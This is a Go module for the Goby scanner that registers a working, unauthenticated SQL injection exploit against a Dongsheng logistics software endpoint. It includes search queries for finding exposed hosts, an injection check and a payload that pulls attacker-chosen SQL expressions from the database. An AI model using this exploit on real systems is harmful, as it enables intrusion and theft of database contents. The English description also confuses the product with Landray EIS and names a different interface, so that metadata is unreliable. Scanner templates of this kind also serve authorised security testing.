package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Dongsheng Logistics Software /Shipping/CompanysAccountGridSource.aspx SQL Injection Vulnerability",
    "Description": "<p>Landray EIS Smart Collaboration Platform is a product designed to provide efficient collaborative office and teamwork for enterprises. This vulnerability exists in the rpt_listreport_definefield.aspx interface, where user input is not properly filtered or validated, allowing attackers to craft malicious requests to exploit this vulnerability and obtain sensitive database information.</p>",
    "Product": "Landray EIS Smart Collaboration Platform",
    "Homepage": "http://www.dongshengsoft.com/",
    "DisclosureDate": "2024-09-03",
    "PostTime": "2025-01-08",
    "Author": "chenyongqiang@baimaohui.net",
    "FofaQuery": "(body=\"FeeCodes/CompanysAdapter.aspx\" || body=\"dhtmlxcombo_whp.js\" || body=\"dongshengsoft\" || body=\"theme/dhtmlxcombo.css\") && body=\"东胜\"",
    "GobyQuery": "(body=\"FeeCodes/CompanysAdapter.aspx\" || body=\"dhtmlxcombo_whp.js\" || body=\"dongshengsoft\" || body=\"theme/dhtmlxcombo.css\") && body=\"东胜\"",
    "Level": "1",
    "Impact": "<p>This vulnerability allows unauthenticated attackers to obtain sensitive database information through SQL injection, potentially leading to data leakage, system integrity compromise, and further attacks.</p>",
    "Recommendation": "<p>It is recommended that affected users immediately contact the vendor to obtain the latest patches and strictly filter and validate user input to prevent SQL injection attacks. Additionally, enabling security measures such as WAF (Web Application Firewall) is advised to enhance system protection.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/134656440?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "DB_NAME(), @@VERSION,USER",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "DB_NAME()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/Shipping/CompanysAccountGridSource.aspx?LINKID=-1%27%20and%201=substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','{{{randnum}}}')),3,32)--&read=exist",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv109.0) Gecko/20100101 Firefox/109.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Connection": "close",
                    "Upgrade-Insecure-Requests": "1"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{{{md5}}}",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/Shipping/CompanysAccountGridSource.aspx?LINKID=-1%27%20and%201='112233'%2B({{{payload_encode}}})%2B'332211'--+&read=exist",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv109.0) Gecko/20100101 Firefox/109.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|112233([^'][\\s\\S]*?)332211",
                "output|when|attackType=sqlpoint|{{{lastreq}}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "东胜物流软件 /Shipping/CompanysAccountGridSource.aspx SQL 注入漏洞",
            "Product": "青岛东胜伟业软件",
            "Description": "<p>东胜物流软件是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。该公司初创于2004年11月（前身为青岛景宏物流信息技术有限公司），专注于航运物流相关环节的产品和服务。东胜物流信息管理系统货代版采用MS-SQLserver大型数据库，结合B/S+C/S的程序架构，流程简捷、严密、灵活，功能强大。具有良好的口碑和广泛的覆盖率。东胜物流软件 CompanysAccountGridSource.aspx&nbsp; 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用&nbsp;SQL&nbsp;注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限<br></p>",
            "Recommendation": "<p>建议受影响用户立即联系厂商获取最新补丁，并对用户输入进行严格的过滤和验证，防止SQL注入攻击。同时，建议启用WAF（Web应用防火墙）等安全措施以增强系统防护。</p>",
            "Impact": "<p>该漏洞允许未经身份验证的攻击者通过SQL注入获取数据库敏感信息，可能导致数据泄露、系统完整性破坏以及进一步的攻击。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Dongsheng Logistics Software /Shipping/CompanysAccountGridSource.aspx SQL Injection Vulnerability",
            "Product": "Landray EIS Smart Collaboration Platform",
            "Description": "<p>Landray EIS Smart Collaboration Platform is a product designed to provide efficient collaborative office and teamwork for enterprises. This vulnerability exists in the rpt_listreport_definefield.aspx interface, where user input is not properly filtered or validated, allowing attackers to craft malicious requests to exploit this vulnerability and obtain sensitive database information.</p>",
            "Recommendation": "<p>It is recommended that affected users immediately contact the vendor to obtain the latest patches and strictly filter and validate user input to prevent SQL injection attacks. Additionally, enabling security measures such as WAF (Web Application Firewall) is advised to enhance system protection.</p>",
            "Impact": "<p>This vulnerability allows unauthenticated attackers to obtain sensitive database information through SQL injection, potentially leading to data leakage, system integrity compromise, and further attacks.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "payload_encode": "define|query_encode|{{{payload}}}",
        "randnum": "define|variable|{{{rand|int|6}}}",
        "md5": "define|md5|{{{randnum}}}"
    },
    "VariablesOrder": [
        "payload",
        "payload_encode",
        "randnum",
        "md5"
    ],
    "EditType": "fast",
    "PocId": "9982"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
